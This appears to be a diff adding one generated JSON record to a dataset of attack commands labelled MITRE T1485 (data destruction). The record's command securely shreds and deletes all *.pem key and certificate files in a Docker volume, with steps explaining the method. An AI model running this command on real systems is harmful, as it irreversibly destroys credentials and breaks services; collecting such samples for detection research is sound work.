@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm -v config:/config debian bash -lc 'find /config -type f -name \"*.pem\" -print0 | xargs -0 -r shred -n 3 -z -u; sync'",
+  "explanation": "Targets sensitive certificate material in the 'config' volume by name, using three-pass overwrite and deletion, followed by a sync.",
+  "rationale_steps": [
+    "Mount the config volume",
+    "Select only *.pem files to avoid unnecessary destruction",
+    "Use shred with multiple passes and zero-fill, then unlink",
+    "Sync changes to disk"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-60f0ffff",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
